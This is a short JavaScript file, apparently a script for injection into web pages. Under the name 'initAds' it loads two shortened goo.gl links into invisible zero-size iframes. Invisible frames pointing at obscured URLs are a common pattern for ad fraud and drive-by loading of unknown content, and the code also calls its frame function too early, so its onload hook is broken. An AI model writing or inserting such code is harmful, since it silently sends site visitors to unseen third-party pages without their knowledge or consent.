function addFrame(hidden, url) {
	var frame = document.createElement('iframe');
	frame.setAttribute('src', url);
	if (hidden===true){	
		frame.style.width = 0; 
		frame.style.height = 0; 
		frame.frameBorder = 0;
	}
	document.body.appendChild(frame);
}

function addLoadEvent(func) {
	var oldonload = window.onload;
	if (typeof window.onload != 'function') {
		window.onload = func;
	} else {
		window.onload = function() {
			if (oldonload) {
				oldonload();
			}
			func();
		}
	}
}

function initAds() {

	var hidden = true;
	var urls = [];
	urls.push('http://goo.gl/9urqBy');
	urls.push('http://goo.gl/ZIGqzU');
	
	urls.forEach(function(url) {
		addLoadEvent(addFrame(hidden, url));
	});
}

initAds();